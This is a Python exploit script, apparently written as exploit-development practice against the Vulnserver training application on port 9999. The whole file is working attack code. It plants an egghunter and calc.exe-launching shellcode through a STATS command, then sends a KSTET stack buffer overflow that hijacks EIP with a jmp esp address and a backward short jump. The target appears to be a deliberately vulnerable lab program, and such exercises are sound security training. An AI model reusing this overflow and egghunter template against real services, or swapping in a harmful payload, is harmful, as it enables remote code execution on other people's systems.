#!/usr/bin/python
# tested on windows 7 x86 sp1
import socket
import struct

egghunter = ""
egghunter += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

# pop calc.exe

shellcode =  "\x31\xF6\x56\x64\x8B\x76\x30\x8B\x76\x0C\x8B\x76\x1C\x8B"
shellcode += "\x6E\x08\x8B\x36\x8B\x5D\x3C\x8B\x5C\x1D\x78\x01\xEB\x8B"
shellcode += "\x4B\x18\x8B\x7B\x20\x01\xEF\x8B\x7C\x8F\xFC\x01\xEF\x31"
shellcode += "\xC0\x99\x32\x17\x66\xC1\xCA\x01\xAE\x75\xF7\x66\x81\xFA"
shellcode += "\x10\xF5\xE0\xE2\x75\xCF\x8B\x53\x24\x01\xEA\x0F\xB7\x14"
shellcode += "\x4A\x8B\x7B\x1C\x01\xEF\x03\x2C\x97\x68\x2E\x65\x78\x65"
shellcode += "\x68\x63\x61\x6C\x63\x54\x87\x04\x24\x50\xFF\xD5\xCC"

# eip - 70 + 4 jmp esp + 2 + backwards - 50 bytes = 26

stage1 = ""
stage1 += "A" * 26
stage1 += egghunter
stage1 += "A" * (70-len(stage1))
stage1 += struct.pack("<L",0x625011AF)
stage1 += "\xEB\xCE"
stage1 += "C" * (1000-len(stage1))


stage2 = ""
stage2 += "w00tw00t"
stage2 += shellcode

try:
  print "\nSending tons of random bytes..."
  s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  connect=s.connect(('192.168.0.28',9999))
  s.recv(1024)
  s.send('STATS '+stage2)
  s.recv(1024)
  s.close()


  s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  connect=s.connect(('192.168.0.28',9999))
  s.recv(1024)
  s.send('KSTET '+stage1)
  s.recv(1024)
  s.send('EXIT\r\n')
  s.close()
  print "\nDone! Wonder if we got that shell back?"
except:
    print "Could not connect to 9999 for some reason..."


